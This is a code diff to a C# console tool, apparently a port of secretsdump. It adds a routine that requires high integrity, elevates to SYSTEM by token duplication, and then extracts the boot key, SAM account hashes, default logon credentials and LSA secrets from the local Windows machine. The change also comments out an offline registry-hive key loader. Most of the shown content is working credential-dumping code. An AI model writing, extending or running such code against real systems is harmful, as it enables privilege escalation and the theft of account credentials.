@@ -1,10 +1,12 @@
 ﻿using System;
 using System.Globalization;
 using System.Linq;
+using System.Runtime.Versioning;
 using System.Security.Cryptography;
 using System.Text;
 using RegHive;
 using secretsdump;
+using SharpSecretsdump;
 
 namespace ConsoleApp
 {
@@ -13,8 +15,13 @@ namespace ConsoleApp
         private static readonly byte[] SYSTEMKEYTRANSFORMS = new byte[] { 8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7 };
         static void Main(string[] args)
         {
-
-            var key = LoadSystemKeyFromHive("sys");
+            if (Environment.OSVersion.Platform == PlatformID.Win32NT)
+            {
+                if (OperatingSystem.IsWindows())
+                {
+                    getLocaldump();
+                }
+            }
             var sysHive = new RegistryHive("sys");
             var samHive = new RegistryHive("sam");
             var secHive = new RegistryHive("sec");
@@ -32,6 +39,51 @@ namespace ConsoleApp
             }
 
         }
+        [SupportedOSPlatform("windows")]
+        static void getLocaldump()
+        {
+            bool alreadySystem = false;
+
+            if (!Helpers.IsHighIntegrity())
+            {
+                Console.WriteLine("You need to be in high integrity to extract LSA secrets!");
+                return;
+            }
+            else
+            {
+                string currentName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
+                bool isSytem = System.Security.Principal.WindowsIdentity.GetCurrent().IsSystem;
+
+                if (isSytem)
+                {
+                    alreadySystem = true;
+                }
+                else
+                {
+                    // elevated but not system, so gotta GetSystem() first
+                    //Console.WriteLine("[*] Elevating to SYSTEM via token duplication for LSA secret retrieval");
+                    if (Helpers.GetSystem() == false)
+                    {
+                        Console.WriteLine($"Failed to elevate: {currentName}");
+                        return;
+                    }
+                }
+            }
+
+            byte[] bootkey = LSADump.GetBootKey();
+
+            Console.WriteLine($"[*] Target system bootKey: 0x{Helpers.Hexlify(bootkey)}");
+
+            Helpers.GetSamAccounts(bootkey);
+            Helpers.GetDefaultLogon();
+            Helpers.GetLsaSecrets(bootkey);
+
+            if (!alreadySystem)
+            {
+                Interop.RevertToSelf();
+            }
+        }
+        /*
         public static byte[] LoadSystemKeyFromHive(string systemHivePath)
         {
             systemHivePath = systemHivePath ?? throw new ArgumentNullException(nameof(systemHivePath));
@@ -64,6 +116,7 @@ namespace ConsoleApp
 
             return systemKeyList.ToArray();
         }
+        */
         private static void DoStuff(string system, string security, string sam)
         {
             //this indicates that our initial connection to the remote registry service on the remote target was unsuccessful, so no point in performing any operations
